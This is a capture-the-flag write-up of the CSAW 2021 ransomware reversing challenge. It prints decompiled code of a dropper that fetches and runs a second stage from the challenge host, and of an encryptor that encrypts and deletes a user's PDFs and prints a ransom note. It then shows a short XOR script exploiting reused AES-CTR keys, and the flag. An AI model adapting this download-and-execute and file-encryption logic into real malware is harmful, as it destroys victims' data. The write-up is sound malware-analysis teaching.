# CSAW ransomwaRE Write Up

## Details:

Jeopardy style CTF

Category: Reverse Engineering

Comments:

Help! Your local convenience store is being held for ransom. Apparently this past July 11th a bunch of their documents got encrypted by the "Noes" gang. The business has backups for some of them, but not their flag file. This was the last straw for the manager, who tapped his slush fund and came to you for help rather than pay the ransom. Here are the files they had left in their directory along with the malware and the ransom notice. Can you REcover the flag?

## Write up:

The first thing I did was set up a VM for this challenge since it was malware. I then decompiled the main function:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{

  GetSystemTime(&SystemTime);
  *(_DWORD *)pbData = SystemTime.wDayOfWeek;
  v3 = 16i64;
  v13 = SystemTime.wMonth;
  v14 = SystemTime.wYear;
  v15 = SystemTime.wDay;
  pdwDataLen = 16;
  phProv = 0i64;
  phHash = 0i64;
  if ( !CryptAcquireContextW(&phProv, 0i64, 0i64, 1u, 0xF0000000) )
    goto LABEL_14;
  if ( !CryptCreateHash(phProv, 0x8003u, 0i64, 0, &phHash) )
  {
    CryptReleaseContext(phProv, 0);
    exit(1);
  }
  if ( !CryptHashData(phHash, pbData, 16u, 0) )
  {
    CryptDestroyHash(phHash);
    CryptReleaseContext(phProv, 0);
    exit(1);
  }
  if ( !CryptGetHashParam(phHash, 2u, v16, &pdwDataLen, 0) )
LABEL_14:
    exit(1);
  v4 = MultiByteStr;
  MultiByteStr[32] = 0;
  v5 = v16;
  do
  {
    format_print_hex(v4, "%02x", *v5);
    v4 += 2;
    ++v5;
    --v3;
  }
  while ( v3 );
  v6 = (WCHAR *)sub_7FF6A36762E0(0x42ui64);
  MultiByteToWideChar(0, 0, MultiByteStr, -1, v6, 33);
  if ( phHash )
    CryptDestroyHash(phHash);
  if ( phProv )
    CryptReleaseContext(phProv, 0);
  http_and_cry(v6);
  return 0;
}
```

I saw that the program used the systems day, month, and year to hash some value and then passed the hashed value to what I renamed to http_and_cry. From the description I also knew the date I would most likely have to set my system to was July 11th, 2021.

```c
__int64 __fastcall http_and_cry(LPCWSTR pwszObjectName)
{

  v24 = -2i64;
  http_obj = WinHttpOpen(
               L"Mozilla / 5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko / 20100101 Firefox / 89.0",
               1u,
               0i64,
               0i64,
               0);
  http_obj_cpy = http_obj;
  if ( !http_obj )
    exit(1);
  http_conn = WinHttpConnect(http_obj, L"rev.chal.csaw.io", 8129u, 0);
  if ( !http_conn )
    exit(1);
  v5 = (char *)sub_7FF6A36762E0(68ui64);
  *(_WORD *)v5 = 47;
  *(_OWORD *)(v5 + 2) = *(_OWORD *)pwszObjectName;
  *(_OWORD *)(v5 + 18) = *((_OWORD *)pwszObjectName + 1);
  *(_OWORD *)(v5 + 34) = *((_OWORD *)pwszObjectName + 2);
  *(_OWORD *)(v5 + 50) = *((_OWORD *)pwszObjectName + 3);
  *((_WORD *)v5 + 33) = pwszObjectName[32];
  get_request = WinHttpOpenRequest(http_conn, L"GET", pwszObjectName, 0i64, 0i64, 0i64, 0);
  hInternet = get_request;
  if ( !get_request )
    exit(1);
  if ( !WinHttpSendRequest(get_request, 0i64, 0, 0i64, 0, 0, 0i64) )
    exit(1);
  if ( !WinHttpReceiveResponse(hInternet, 0i64) )
    exit(1);
  response = 0;
  dwBufferLength = 4;
  WinHttpQueryHeaders(hInternet, 0x20000013u, 0i64, &response, &dwBufferLength, 0i64);
  if ( response != 200 )                        // look for 200 response
    exit(1);
  memset(v27, 0, 264ui64);
  v27[0] = (__int64)&unk_7FF6A367B600;
  std::ios::ios(&v27[21]);
  std::ostream::ostream(v27, &v27[1], 0i64, 0i64);
  *(__int64 *)((char *)v27 + *(int *)(v27[0] + 4)) = (__int64)&std::ofstream::`vftable';
  *(DWORD *)((char *)&ProcessInformation.dwThreadId + *(int *)(v27[0] + 4)) = *(_DWORD *)(v27[0] + 4) - 168;
  v22 = &v27[1];
  std::streambuf::streambuf(&v27[1]);
  v27[1] = (__int64)&std::filebuf::`vftable';
  BYTE4(v27[16]) = 0;
  BYTE1(v27[15]) = 0;
  std::streambuf::_Init(&v27[1]);
  v27[17] = 0i64;
  *(__int64 *)((char *)&v27[15] + 4) = qword_7FF6A36808C8;
  v27[14] = 0i64;
  sys_proc_path = (wchar_t *)malloc(0x208ui64);
  v9 = wgetenv(L"USERPROFILE");
  wcsncpy(sys_proc_path, v9, 227ui64);          // append the user profile
  wcsncat(sys_proc_path, L"\\AppData\\Local\\Temp\\sys_proc.txt", 33ui64);// append path to local app data
  if ( v27[17] || (v10 = std::_Fiopen(sys_proc_path, 2, 64)) == 0i64 )
  {
    std::ios::setstate((char *)v27 + *(int *)(v27[0] + 4), 2i64);
  }
  else
  {
    sub_7FF6A3674230(&v27[1], v10, 1i64);
    v11 = std::streambuf::getloc(&v27[1], &v22);
    v12 = (std::codecvt_base *)sub_7FF6A3675120(v11);
    if ( std::codecvt_base::always_noconv(v12) )
    {
      v27[14] = 0i64;
    }
    else
    {
      v27[14] = (__int64)v12;
      std::streambuf::_Init(&v27[1]);
    }
    if ( v23 )
    {
      v13 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v23 + 16i64))(v23);
      if ( v13 )
        (**v13)(v13, 1i64);
    }
    std::ios::clear((char *)v27 + *(int *)(v27[0] + 4), 0i64, 0i64);
  }
  if ( (*((_BYTE *)&v27[2] + *(int *)(v27[0] + 4)) & 6) != 0 )
  {
    free(sys_proc_path);
    exit(1);
  }
  do
  {
    dwNumberOfBytesAvailable[0] = 0;
    if ( !WinHttpQueryDataAvailable(hInternet, dwNumberOfBytesAvailable) )
    {
      free(sys_proc_path);
      exit(1);
    }
    v14 = sub_7FF6A36762E0(dwNumberOfBytesAvailable[0] + 1);
    v15 = v14;
    if ( !v14 )
    {
      dwNumberOfBytesAvailable[0] = 0;
      free(sys_proc_path);
      exit(1);
    }
    memset(v14, 0, dwNumberOfBytesAvailable[0] + 1);
    if ( !WinHttpReadData(hInternet, v15, dwNumberOfBytesAvailable[0], &dwNumberOfBytesRead) )
    {
      free(sys_proc_path);
      exit(1);
    }
    std::ostream::write(v27, v15, dwNumberOfBytesAvailable[0]);
    operator delete[](v15);
  }
  while ( dwNumberOfBytesAvailable[0] );
  if ( !sub_7FF6A36742F0(&v27[1]) )
    std::ios::setstate((char *)v27 + *(int *)(v27[0] + 4), 2i64);
  WinHttpCloseHandle(hInternet);
  WinHttpCloseHandle(http_conn);
  WinHttpCloseHandle(http_obj_cpy);
  if ( (unsigned int)create_sys_proc(sys_proc_path) )
  {
    free(sys_proc_path);
    exit(1);
  }
  memset(&StartupInfo.cb + 1, 0, 0x64ui64);
  StartupInfo.cb = 104;
  ProcessInformation.hProcess = 0i64;
  ProcessInformation.hThread = 0i64;
  *(_QWORD *)&ProcessInformation.dwProcessId = 0i64;
  if ( !CreateProcessW(sys_proc_path, 0i64, 0i64, 0i64, 0, 0, 0i64, 0i64, &StartupInfo, &ProcessInformation) ) // do NOT let this get hit
  {
    free(sys_proc_path);
    exit(1);
  }
  WaitForSingleObject(ProcessInformation.hProcess, 0xFFFFFFFF);
  sys_procid_path = (wchar_t *)malloc(520ui64); // malloc space for the path
  user_profile = wgetenv(L"USERPROFILE");
  wcsncpy_s(sys_procid_path, 0x104ui64, user_profile, 0xE1ui64);// copy user profile to path
  wcsncat_s(sys_procid_path, 0x104ui64, L"\\AppData\\Local\\Temp\\sys_procid.txt", 0x23ui64);// cat path to the sys_procid.txt file
  userIdFile = wfopen(sys_procid_path, L"rb");  // open sys_procid.txt to read for the user id
  userIdFile2 = userIdFile;
  if ( userIdFile && (fread(userId, 2ui64, 17ui64, userIdFile), !ferror(userIdFile2)) )// if we read it, delete the file
                                                // 
                                                // read 17 2 byte characters
  {
    fclose(userIdFile2);
    if ( !DeleteFileW(sys_procid_path) )
    {
      free(sys_procid_path);
      exit(1);
    }
    free(sys_procid_path);
  }
  else                                          // else just free the fd
  {
    free(sys_procid_path);
    if ( *errno() )
    {
      free(sys_proc_path);
      exit(1);
    }
  }
  if ( !DeleteFileW(sys_proc_path) )            // try deleting the other file
  {
    free(sys_proc_path);
    exit(1);
  }
  v20 = sub_7FF6A3674D00(std::cout);            // print out the emoji ascii art
  sub_7FF6A3674F00(v20);
  wideprint((wchar_t *)&Format);
  wideprint((wchar_t *)L"                                       O H   N O E S ! ! ! ! \n\n");
  wideprint((wchar_t *)&Format);
  wideprint((wchar_t *)L"WE HAVE ENCRYPTED YOUR SECRET CSAW FILES WITH CSAWLOCKER.\n");
  wideprint((wchar_t *)L"WE ACCEPT PAYMENT IN FLAGS, MONTHLY INSTALLMENTS ARE ACCEPTABLE.\n");
  wideprint((wchar_t *)L"YOUR USER ID IS %s WHEN YOU CONTACT OUR CUSTOMER SERVICE DEPARTMENT.\n", userId);
  wideprint((wchar_t *)L"DON'T TRY TO GET YOUR DATA BACK BEFORE THE END OF THE CTF, OUR RANSOMWARE IS FOOLPROOF.\n");
  wideprint((wchar_t *)L"\n");
  wideprint((wchar_t *)L"P.S. MUAHAHAHAHAHA.\n");
  free(sys_proc_path);
  return sub_7FF6A3672530(v27);
}
```

Looking at this function I saw that we connect to a webserver and using the hashed value we download a file from rev.chal.csaw.io:8129/[hashed value]. The program then does some crypto stuff on that file and saves it. I decided to just set the system time on the vm to the date and let the program run up until the point where it saves the file but before it creates a new process with said file.

I then decompiled the downloaded file:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{

  _main(argc, argv, envp);
  key_iv = generateKeyIV();                     // generate the key_iv
  directoryPath = (wchar_t *)malloc(520ui64);   // malloc the directory path
  USERPROFILE = _wgetenv(L"USERPROFILE");
  wcsncpy_s(directoryPath, 0x104ui64, USERPROFILE, 0xE8ui64);
  wcsncat(directoryPath, L"\\SecretCSAWDocuments\\", 0x16ui64);
  directoryDupe = (wchar_t *)malloc(520ui64);   // malloc space for directory dupe
  wcsncpy_s(directoryDupe, 0x104ui64, directoryPath, 0x104ui64);
  basePath = (wchar_t *)malloc(520ui64);        // malloc base path space
  wcsncpy_s(basePath, 0x104ui64, directoryPath, 0x104ui64);
  fileToEncryptPath = (wchar_t *)malloc(520ui64);// malloc space for files to encrypt
  if ( PathFileExistsW(directoryPath) )
  {
    writeUserID(key_iv);                        // writes key iv to proc id: ab53f132c859a706
    sendKey(key_iv);                            // sends key to their server?
    wcsncat(directoryPath, L"*.pdf", 6ui64);
    hFind = FindFirstFileW(directoryPath, &firstFile);// find the first .pdf file
    if ( hFind != (HANDLE)-1i64 )               // if file exists
    {
      do
      {
        wcsncpy_s(fileToEncryptPath, 260ui64, directoryDupe, 260ui64);// copies directory dupe to fileToEncryptPath
        length_of_file_name = wcslen(firstFile.cFileName);// gets the length of the filename
        wcsncat(fileToEncryptPath, firstFile.cFileName, length_of_file_name);// cat the file name to where we want to encrypt it
        encryptionErrorCode = encryptAndWrite(basePath, fileToEncryptPath, key_iv);
        if ( encryptionErrorCode )              // if it fails, free everything and exit
        {
          free(key_iv->customer_id);
          free(key_iv->iv);
          free(key_iv->key);
          free(key_iv);
          free(directoryPath);
          free(basePath);
          free(directoryDupe);
          free(fileToEncryptPath);
          exit(encryptionErrorCode);
        }
        memset(fileToEncryptPath, 0, 0x104ui64);
      }
      while ( FindNextFileW(hFind, &firstFile) );// loop through all files
      FindClose(hFind);
    }
  }
  free(key_iv->customer_id);
  free(key_iv->iv);
  free(key_iv->key);
  free(key_iv);
  free(directoryPath);
  free(basePath);
  free(directoryDupe);
  free(fileToEncryptPath);
  return 0;
}
```

From the main function I noticed a few things. The most important were the generateKeyIV function and the encryptAndWrite function.

```c
Struct *__cdecl generateKeyIV()
{

  mats = (Struct *)malloc(0x20ui64);
  if ( !mats )
    exit(1);
  mats->key = (unsigned __int8 *)malloc(0x10ui64);
  mats->iv = (unsigned __int8 *)malloc(0x10ui64);
  mats->customer_id = (unsigned __int8 *)malloc(8ui64);
  if ( !(unsigned int)RAND_bytes(mats->key, 16i64)
    || !(unsigned int)RAND_bytes(mats->iv, 16i64)
    || !(unsigned int)RAND_bytes(mats->customer_id, 8i64) )
  {
    free(mats->key);
    free(mats->iv);
    free(mats->customer_id);
    free(mats);
    exit(1);
  }
  mats->cipher_type = (const EVP_CIPHER *)EVP_aes_128_ctr();
  return mats;
}
```

The generateKeyIV function was important because it told me what type of cipher the ransomware used: aes ctr.

It also told me the key and the iv were generated once and then used for all files which meant that I would most likely be able to abuse the cipher type.

```c
int __cdecl encryptAndWrite(wchar_t *basePath, WCHAR *fileToEncryptPath, Struct *keyIv)
{

  *(_QWORD *)hashDigits = '3\02\01\00';
  *(_QWORD *)&hashDigits[4] = '7\06\05\04';
  *(_QWORD *)&hashDigits[8] = 'b\0a\09\08';
  *(_QWORD *)&hashDigits[12] = 'f\0e\0d\0c';
  hashDigits[16] = 0;
  dwStatus = 0;
  *(_QWORD *)outfileSuffix = 'f\0d\0p\0.';      // .pdf.cryptastic
  *(_QWORD *)&outfileSuffix[4] = 'y\0r\0c\0.';
  *(_QWORD *)&outfileSuffix[8] = 's\0a\0t\0p';
  *(_QWORD *)&outfileSuffix[12] = 'c\0i\0t';
  fSuccess = 1;
  dwStatus = get_sha256_sum(sha256Hash, fileToEncryptPath);// gets the sha256 sum of the file
  if ( dwStatus )
    return -1;
  basePathLen = wcslen(basePath);               // gets the length of the base path
  outfileNameLength = basePathLen + wcslen(outfileSuffix) + 65;// gets length of file plus crypt
  if ( outfileNameLength > 0x104 )              // checks if file is an ok length
    return -1;
  outfileName = (wchar_t *)malloc(2 * outfileNameLength);// malloc double the space
  basePathLen2 = wcslen(basePath);
  wcsncpy_s(outfileName, outfileNameLength, basePath, basePathLen2);// copy the new filename
  i = 0;
  for ( i_0 = 0; i_0 <= 31; ++i_0 )             // make the filename encrypted
  {
    wcsncat(outfileName, &hashDigits[sha256Hash[i_0] >> 4], 1ui64);
    wcsncat(outfileName, &hashDigits[sha256Hash[i_0] & 0xF], 1ui64);
  }
  outfileSuffixLen = wcslen(outfileSuffix);
  wcsncat_s(outfileName, outfileNameLength, outfileSuffix, outfileSuffixLen + 1);// copy the suffix to the file
  outfile = 0i64;
  infile = _wfopen(fileToEncryptPath, aR);      // open original in read mode
  if ( infile )
  {
    outfile = _wfopen(outfileName, L"wb");      // open out in write mode
    if ( outfile )                              // if we were able to open the file
    {
      cipher_block_size = EVP_CIPHER_block_size(keyIv->cipher_type);// EVP_aes_128_ctr
      v17 = cipher_block_size + 1024 - 1i64;
      v7 = alloca(16 * ((unsigned __int64)(cipher_block_size + 1024 + 15i64) >> 4));
      p_out_buf = (unsigned __int8 (*)[])&v8;
      ctx = (EVP_CIPHER_CTX *)EVP_CIPHER_CTX_new();
      if ( ctx && (unsigned int)EVP_CipherInit_ex(ctx, keyIv->cipher_type, 0i64, 0i64, 0i64, 1) )
      {
        if ( (unsigned int)EVP_CIPHER_CTX_key_length(ctx) != 16 )
          OPENSSL_die(
            "assertion failed: EVP_CIPHER_CTX_key_length(ctx) == AES_KEY_SIZE",
            "C:\\Users\\IEUser\\Documents\\CSAW-9-2021\\CSAW-CTF-2021-Quals\\rev\\ransomware\\encryptor.c",
            284i64);
        if ( (unsigned int)EVP_CIPHER_CTX_iv_length(ctx) != 16 )
          OPENSSL_die(
            "assertion failed: EVP_CIPHER_CTX_iv_length(ctx) == AES_KEY_SIZE",
            "C:\\Users\\IEUser\\Documents\\CSAW-9-2021\\CSAW-CTF-2021-Quals\\rev\\ransomware\\encryptor.c",
            285i64);
        if ( (unsigned int)EVP_CipherInit_ex(ctx, 0i64, 0i64, keyIv->key, keyIv->iv, 1) )
        {
          while ( 1 )
          {
            num_bytes_read = fread(in_buf, 1ui64, 0x400ui64, infile);
            if ( ferror(infile) )
              break;
            if ( !(unsigned int)EVP_CipherUpdate(ctx, p_out_buf, &out_len, in_buf, num_bytes_read) )
              break;
            fwrite(p_out_buf, 1ui64, out_len, (FILE *)outfile);
            if ( ferror((FILE *)outfile) )
              break;
            if ( num_bytes_read <= 1023 )
            {
              if ( (unsigned int)EVP_CipherFinal_ex(ctx, p_out_buf, &out_len) )
              {
                fwrite(p_out_buf, 1ui64, out_len, (FILE *)outfile);
                if ( !ferror((FILE *)outfile) )
                {
                  EVP_CIPHER_CTX_reset(ctx);
                  fclose(infile);
                  fclose((FILE *)outfile);
                  fSuccess = DeleteFileW(fileToEncryptPath);
                  if ( fSuccess )
                  {
                    free(outfileName);
                    result = 0;
                  }
                  else
                  {
                    free(outfileName);
                    result = GetLastError();
                  }
                  return result;
                }
              }
              break;
            }
          }
        }
        EVP_CIPHER_CTX_reset(ctx);
        free(outfileName);
        fclose(infile);
        fclose((FILE *)outfile);
        result = *_errno();
      }
      else
      {
        free(outfileName);
        fclose(infile);
        fclose((FILE *)outfile);
        result = *_errno();
      }
    }
    else
    {
      free(outfileName);
      fclose(infile);
      result = *_errno();
    }
  }
  else
  {
    free(outfileName);
    result = *_errno();
  }
  return result;
}
```

The encryptAndWrite function was important because it showed me how the files were encrypted and let me see which file was encrypted to which encrypted file:

```
2020 IC3 is cad0b75505847a4792a67bb33ece21ec9c7bd21395ca6b158095d92772e01637
20180212_ is 9df65cc45479c058ef4a600c1e607fec44d83682db732f077817c58bed47a191
us-aers- is a25981adfb782d04cccfb2ad66ae8e63ead31f62fb898913f1ec99359f2e1c4b
```

From here I checked if xor'ing one file with it's encrypted counterpart gave us the same values (could be done because of cipher type and all of the files using the same key and iv). This ended up being the case so I wrote a script that would take the xor'ed values and xor the encrypted flag file to get the flag:

```py
f = open('2020_IC3Report.pdf.backup', "rb").read()
f2 = open('cad0b75505847a4792a67bb33ece21ec9c7bd21395ca6b158095d92772e01637.pdf.cryptastic', "rb").read()

f3 = open('ea6b505ffded681a256232ed214d4c3b410c8b4f052775eb7e67dcbd5af64e63.pdf.cryptastic', "rb").read()

f4 = open('flag.pdf', "wb")

x= []

for i in range(len(f3)):
	x.append((f3[i] ^ (f[i] ^ f2[i])))

f4.write(bytes(x))
```

This then generated a pdf file which said the flag was:

```
flag{w4y_t0_put_th3_RE_1n_W1nd0w5_r4n50mw4RE}
```